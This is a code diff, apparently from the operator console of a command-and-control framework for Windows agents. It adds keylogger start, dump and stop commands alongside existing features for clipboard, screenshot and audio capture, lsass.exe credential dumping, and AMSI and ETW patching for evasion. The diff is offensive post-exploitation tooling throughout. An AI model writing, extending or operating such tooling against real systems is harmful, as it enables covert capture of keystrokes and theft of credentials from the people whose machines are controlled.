@@ -84,6 +84,11 @@ agent_completer_windows = NestedCompleter.from_nested_dict({
     'clipboard': None,
     'screenshot': None,
     'audio': None,
+    'keylog': {
+        'start': None,
+        'dump': None,
+        'stop': None
+    },
     'patch': {
         'amsi': None,
         'etw': None
@@ -192,7 +197,10 @@ def print_agent_help(os):
     --== Collection Stuff ==--
     clipboard                              ->  retrieve clipboard
     screenshot                             ->  retrieve screenshot
-    audio <record-time>                    ->  record audio 
+    audio <record-time>                    ->  record audio
+    keylog start                           ->  start keylogger
+    keylog dump                            ->  retrieve captured keystrokes
+    keylog stop                            ->  retrieve captured keystrokes and stop keylogger
     
     --== Post Exploitation Stuff ==--
     lsass <method>                         ->  dump lsass.exe [methods:  direct,comsvcs] (elevation required)
@@ -403,6 +411,13 @@ def agent_screen_windows(agent_id):
                     "assembly_args": assembly_args
                 }
 
+            elif re.fullmatch(r"\s*keylog\s+(start|dump|stop)\s*", command):
+                action = shlex.split(re.sub(r"\s*keylog\s+", "", command, 1))[0]
+                command_dict = {
+                    "command_type": "keylog",
+                    "action": action
+                }
+            
             elif re.fullmatch(r"\s*patch\s+(etw|amsi)\s*", command):
                 patch_func = shlex.split(re.sub(r"\s*patch\s+", "", command, 1))[0]
                 command_dict = {
